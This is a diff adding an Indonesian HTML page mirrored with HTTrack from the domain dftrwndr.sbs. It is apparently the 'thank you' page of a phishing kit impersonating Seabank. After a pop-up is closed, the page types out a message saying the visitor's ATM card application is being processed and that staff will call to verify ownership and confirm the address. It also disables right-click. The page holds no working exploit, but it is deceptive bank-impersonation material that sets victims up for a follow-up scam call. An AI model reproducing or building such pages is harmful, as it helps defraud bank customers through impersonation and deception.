@@ -1,0 +1,146 @@
+<!DOCTYPE html><html lang="id"><!-- Mirrored from dftrwndr.sbs/wrjk0/win.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 06 Jun 2025 05:50:57 GMT --><head>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#008899">
+    <title>Terimakasih Telah Mendaftar</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #2673DD;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Pop-up styling */
+        .popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+             background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .popup img {
+            max-width: 50%;
+            max-height: 50%;
+            border: 2px solid #2673DD;
+            border-radius: 10px;
+        }
+
+        /* Kotak teks tetap ada */
+.box {
+    width: 320px;
+    height: 150px;
+    background: #2673DD;
+    margin-top:-10%;
+    margin: 50px auto;
+    border-radius: 10px; /* Membuat sudut lebih tumpul */
+    box-shadow: 0px 2px 5px #ff8700;
+    position: relative;
+    border: 2px solid #b8860b;
+    
+    padding: 10px;
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-start;
+    align-items: flex-start;
+    overflow-y: auto;
+}
+
+
+        .text-container {
+            font-size: 15px;
+            font-weight: bold;
+            width: 100%;
+            color:#ffffff;
+            
+            text-align: center;
+            word-wrap: break-word;
+            white-space: pre-line;
+            overflow: hidden;
+        }
+
+        .cursor {
+            display: inline-block;
+            width: 1px;
+            height: 18px;
+            background-color: black;
+            animation: blink 0.7s infinite;
+        }
+
+        @keyframes blink {
+            50% { background-color: transparent; }
+        }
+        
+                nav {
+            width: 100%;
+            position: fixed;
+            background-color: white;
+            z-index: 1000;
+            
+        }
+        nav.top {
+            top: 0;
+            border-bottom: 1px solid #ddd;
+        }
+        nav.bottom {
+            bottom: 0;
+            border-top: 1px solid #ddd;
+        }
+        nav img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+      <nav class="top">
+        <img src="images/nav1.png" alt="Nav Atas">
+   <img width="100%" src="images/bisnis.webp" alt=""><div class="popup" id="popup" onclick="closePopup()">
+        <img src="images/IMG-3833.jpg" alt="Popup Gambar">
+    </div>
+
+    <!-- Kotak teks tetap ada -->
+    <div class="box">
+        <div class="text-container" id="text-container">
+            <span id="text"></span><span class="cursor"> </span>
+        </div>
+    </div>
+
+    <audio id="audio" src=""></audio>
+
+    <script>
+        function closePopup() {
+            document.getElementById("popup").style.display = "none";
+
+            // Memainkan suara
+            document.getElementById("audio").play();
+
+            // Efek mengetik
+            let text = "Terima kasih Pengajuan kartu ATM Seabank anda sedang kami proses setelah kartu ATM Anda Tercetak Tim terkait kami akan menghubungi Untuk Verifikasi Kepemilikan &  Konfirmasi alamat penerima kartu ATM nya mohon bersabar akan diproses sesuai antrian";
+            let i = 0;
+            function typeWriter() {
+                if (i < text.length) {
+                    document.getElementById("text").innerHTML += text.charAt(i);
+                    i++;
+                    setTimeout(typeWriter, 65);
+                }
+            }
+            typeWriter();
+        }
+        document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
+    </script>
+
+
+
+
+</nav></body><!-- Mirrored from dftrwndr.sbs/wrjk0/win.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 06 Jun 2025 05:50:58 GMT --></html>
